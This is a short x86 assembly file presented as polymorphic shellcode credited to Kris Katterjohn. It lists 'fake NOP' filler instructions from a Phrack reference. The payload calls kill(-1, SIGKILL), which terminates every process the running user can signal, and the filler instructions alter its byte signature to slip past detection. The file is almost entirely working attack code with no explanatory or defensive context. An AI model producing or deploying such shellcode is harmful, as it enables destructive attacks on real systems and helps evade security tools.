
/* Polymorphic shellcode from Kris Katterjohn 11/13/2006 */
/* adp, 2018 */
/* 

list of fake NOPs:

ADC $0x11F8FA81    #instruction demanding 4-bytes argument
STC                #one-byte instructions
DAA
DAS
NOP
SAHF

ref: http://phrack.org/issues/61/9.html

*/

.global main
.text

main:
	xchg %eax, %ebx
	xor %ecx, %ecx
	mul %ebx
	stc
	movb $37, %al
	das
	movl $-1, %ebx
	daa
	movb $9, %cl
	sahf
	int $0x80
	
